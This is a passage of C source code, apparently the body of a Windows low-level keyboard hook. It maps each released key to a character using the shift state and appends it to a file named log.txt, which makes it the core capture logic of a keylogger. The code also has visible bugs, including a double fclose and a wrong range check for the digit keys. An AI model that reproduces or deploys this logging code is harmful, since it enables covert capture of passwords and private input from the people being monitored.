 switch(wParam)
    {
        case WM_KEYUP: // When the key has been pressed and released
        {
            // Assign keyboard code to local variable
            DWORD vkCode = hooked.vkCode;

            // Open log file
            FILE *file;
            file=fopen("log.txt","a+");

            // Process keyboard strokes
            if(file!=NULL)
            {
                 if((vkCode>=39)&&(vkCode<=64)) // Keys 0-9
                {
                    if(GetAsyncKeyState(VK_SHIFT)) // Check if shift key is down (fairly accurate)
                    {

                        switch(vkCode) // 0x30-0x39 is 0-9 respectively
                        {
                            case 0x30:
                                fputc(')',file);
                                fclose(file);
                                break;
                            case 0x31:
                                fputc('!',file);
                                fclose(file);
                                break;
                            case 0x32:
                                fputc('@',file);
                                fclose(file);
                                break;
                            case 0x33:
                                fputc('#',file);
                                fclose(file);
                                break;
                            case 0x34:
                                fputc('$',file);
                                fclose(file);
                                break;
                            case 0x35:
                                fputc('%',file);
                                fclose(file);
                                break;
                            case 0x36:
                                fputc('^',file);
                                fclose(file);
                                break;
                            case 0x37:
                                fputc('&',file);
                                fclose(file);
                                break;
                            case 0x38:
                                fputc('*',file);
                                fclose(file);
                                break;
                            case 0x39:
                                fputc('(',file);
                                fclose(file);
                                break;
                        }
                    } 
                    else // If shift key is not down
                        fputc(vkCode,file);
                        fclose(file);

                 }
                else if((vkCode>64)&&(vkCode<91)) // Keys a-z
                {
                    if(!GetAsyncKeyState(VK_SHIFT)) // If the shift key is not down, un-capitalize letters
                    {
                        vkCode+=32;
                    }
                    fputc(vkCode,file);
                    fclose(file);
                }
                
                else
                {
                    switch(vkCode) // Check for other keys
                    {
                        case VK_SPACE:
                            fputc(' ',file);
                            fclose(file);
                            break;
                        case VK_RETURN:
                            fputs("\n",file);
                            fclose(file);
                            break;
                        case VK_INSERT:
                            fputs("[INSERT]",file);
                            fclose(file);
                            break;
                        case VK_DELETE:
                           fputs("[DEL]",file);
                            fclose(file);
                            break;
                        case VK_OEM_2:
                            if(GetAsyncKeyState(VK_SHIFT))
                                fputs("?",file);
                            else
                                fputs("/",file);
                            fclose(file);
                            break;
                        case VK_OEM_3:
                            if(GetAsyncKeyState(VK_SHIFT))
                                fputs("~",file);
                            else
                                fputs("`",file);
                            fclose(file);
                            break;
                            case VK_OEM_4:
                            if(GetAsyncKeyState(VK_SHIFT))
                                fputs("{",file);
                            else
                                fputs("[",file);
                            fclose(file);
                            break;
                            case VK_OEM_5:
                            if(GetAsyncKeyState(VK_SHIFT))
                                fputs("|",file);
                            else
                                fputs("\\",file);
                            fclose(file);
                            break;
                            case VK_OEM_6:
                            if(GetAsyncKeyState(VK_SHIFT))
                                fputs("}",file);
                            else
                                fputs("]",file);
                            fclose(file);
                            break;
                            case VK_OEM_7:
                            if(GetAsyncKeyState(VK_SHIFT))
                                fputs("\"",file);
                            else
                                fputs("'",file);
                            fclose(file);
                            break;
                        case VK_LSHIFT:
                        case VK_RSHIFT:
                            // do nothing;
                            fclose(file);
                            break;
                        case 0xBC:                //comma       
                             if(GetAsyncKeyState(VK_SHIFT))
                                fputs("<",file);
                            else
                                fputs(",",file);
                            fclose(file);
                            break;
                            case 0xBE:              //Period
                             if(GetAsyncKeyState(VK_SHIFT))
                                fputs(">",file);
                            else
                                fputs(".",file);
                            fclose(file);
                            break;
                            case 0xBA:              //Semi Colon
                             if(GetAsyncKeyState(VK_SHIFT))
                                fputs(":",file);
                            else
                                fputs(";",file);
                            fclose(file);
                            break;
                            case 0xBD:              //Minus
                             if(GetAsyncKeyState(VK_SHIFT))
                                fputs("_",file);
                            else
                                fputs("-",file);
                            fclose(file);
                            break;
                            case 0xBB:              //Equal
                             if(GetAsyncKeyState(VK_SHIFT))
                                fputs("+",file);
                            else
                                fputs("=",file);
                            fclose(file);
                            break;
                        default:
                            
                            //  Use Getnametext instead of a lot of switch statements for system keys.
                            
        DWORD dwMsg = 1;
        dwMsg += hooked.scanCode << 16;
        dwMsg += hooked.flags << 24;

        char key[16];
        GetKeyNameTextA(dwMsg,key,15);

                            
                            fputs(key, file);      
                            fclose(file);



                    }
                }
            }
        }
        default:
            return CallNextHookEx( NULL, nCode, wParam, lParam );
    }